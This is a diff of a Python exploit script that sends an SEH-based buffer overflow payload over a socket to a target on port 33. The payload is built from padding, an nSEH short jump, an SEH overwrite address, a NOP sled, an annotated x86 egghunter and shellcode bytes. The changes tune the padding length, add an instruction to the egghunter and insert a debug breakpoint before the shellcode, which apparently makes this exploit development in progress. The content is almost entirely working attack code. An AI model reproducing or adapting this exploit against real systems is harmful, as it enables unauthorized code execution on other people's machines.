@@ -9,7 +9,7 @@ socket.connect((ip , 33))
 
 # evil = "A"* 330
 junk = "A" * 50
-morejunk = "B" * 15
+morejunk = "B" * 14
 nseh = "\xeb\x06\x90\x90"
 seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
@@ -25,6 +25,7 @@ eggh = (
 "\x53"                                # PUSH EBX
 "\xb3\xc0"			      			  # MOV BL,0xc0
 "\x66\x81\xCA\xFF\x0F"                # OR DX,0FFF
+"\x89\xEA"   # mov edx, ebp
 "\x42"                                # INC EDX
 "\x52"                                # PUSH EDX
 "\x6A\x26"    						  # PUSH 26 
@@ -45,7 +46,7 @@ eggh = (
 "\xFF\xE7"                            # JMP EDI
 )
 shellcode = (
-"\xe8\x00\x00\x00\x00\x5a\x8d\x52"
+"\xCC\xe8\x00\x00\x00\x00\x5a\x8d\x52"
 "\xfb\x52\xbb\x8e\xfe\x1f\x4b\xe8"
 "\x32\x00\x00\x00\x5a\x55\x52\x89"
 "\xc5\x8d\xb2\xed\x00\x00\x00\x8d"
